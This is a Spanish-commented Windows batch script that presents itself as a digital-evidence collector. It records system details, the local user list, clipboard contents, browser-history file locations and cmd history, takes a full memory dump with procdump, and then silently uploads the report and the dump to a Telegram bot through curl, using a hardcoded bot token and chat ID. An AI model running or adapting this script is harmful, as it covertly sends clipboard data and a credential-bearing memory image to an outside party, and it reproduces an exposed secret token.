@echo off
cd /d C:\
echo ============================================================
echo   RECOLECTANDO EVIDENCIAS DIGITALES
echo ============================================================
echo.

:: Crear carpeta
mkdir C:\EVIDENCIAS_COMPLETAS 2>nul

:: INICIO DEL INFORME
echo ============================================================ > C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo           INFORME COMPLETO DEL SISTEMA >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo Fecha: %date% %time% >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo Equipo: %computername% >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo Usuario: %username% >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: SISTEMA OPERATIVO
echo [1] SISTEMA OPERATIVO >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
wmic os get caption,version,buildnumber >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: PROCESADOR
echo [2] PROCESADOR >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
wmic cpu get name,maxclockspeed,numberofcores >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: MEMORIA RAM
echo [3] MEMORIA RAM >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
wmic memorychip get capacity,speed,devicelocator >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: TARJETA GRAFICA
echo [4] TARJETA GRAFICA >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
wmic path win32_VideoController get name >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: DIRECCION IP
echo [5] DIRECCION IP >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
ipconfig | findstr IPv4 >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: USUARIOS
echo [6] USUARIOS >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
net user >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: DISCOS DUROS
echo [7] DISCOS DUROS >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
wmic logicaldisk get deviceid,size,freespace >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: PORTAPAPELES
echo [8] PORTAPAPELES >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
powershell -Command Get-Clipboard >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: HISTORIAL NAVEGACION
echo [9] HISTORIAL NAVEGACION >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
dir "%userprofile%\AppData\Local\Google\Chrome\User Data\Default\History" >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt 2>nul
dir "%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\History" >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: HISTORIAL CMD
echo [10] HISTORIAL CMD >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
doskey /history >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt 2>nul
echo. >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: FIN DEL INFORME
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo              FIN DEL INFORME >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt
echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\INFORME.txt

:: GENERAR VOLCADO DE RAM
echo.
echo Generando volcado de memoria RAM...
C:\EVIDENCIAS_COMPLETAS\procdump.exe -ma -accepteula C:\EVIDENCIAS_COMPLETAS\memory.dmp

:: ENVIAR A TELEGRAM (CONFIGURAR TOKEN Y CHAT ID)
set BOT_TOKEN=8886338270:AAHbMMSRXqOSKKc5CaTiw2mdWACnV_0Zd2Q
set CHAT_ID=5064456618

curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\INFORME.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1

echo.
echo Archivos enviados a Telegram!
start notepad C:\EVIDENCIAS_COMPLETAS\INFORME.txt
start explorer C:\EVIDENCIAS_COMPLETAS
pause